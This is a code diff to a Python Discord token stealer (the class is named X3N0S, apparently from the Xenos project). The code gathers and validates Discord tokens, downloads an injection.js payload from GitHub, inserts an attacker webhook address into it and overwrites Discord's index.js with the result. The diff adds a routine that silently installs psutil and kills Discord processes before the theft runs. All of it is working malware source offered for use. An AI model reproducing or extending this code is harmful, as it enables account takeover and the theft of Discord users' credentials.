@@ -5,7 +5,7 @@ import os, re, threading, urllib.request
 
 class X3N0S:
     def __init__(self):
-        self.host = "https://yourwebsite.com" # No put / at the end
+        self.host = "https://yourwebsite.com/"
         self.all_tokens = []
         self.valid_tokens = []
         self.paths = {
@@ -69,10 +69,19 @@ class X3N0S:
                 for file in os.listdir(end_path):
                     if "index.js" in file.lower():
                         os.makedirs(end_path+"\\XenosStealer")
-                        open(end_path+"index.js", 'w', encoding="UTF-8").write((urllib.request.urlopen(urllib.request.Request("https://raw.githubusercontent.com/KanekiWeb/Xenos/main/Grabber/Injection/injection.js")).read().decode('utf-8')).replace("%WEBHOOK_LINK%", self.host))
+                        open(end_path+"index.js", 'w', encoding="UTF-8").write((urllib.request.urlopen(urllib.request.Request("https://github.com/KanekiWeb/Xenos/blob/main/Grabber/Injection/injection.js")).read().decode('utf-8')).replace("%WEBHOOK_LINK%", self.host))
             except:pass
 
+    def __KillInstance(self):
+        for _ in range(2):
+            try:import psutil
+            except:os.system('pip install psutil >nul')
+        
+        for proc in psutil.process_iter():
+            if any(procstr in proc.name().lower() for procstr in ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):proc.kill()
+
     def __Main__(self):
+        self.__KillInstance()
         self.__WriteStub()
         self.__Check_Tokens()
         for token in self.valid_tokens:
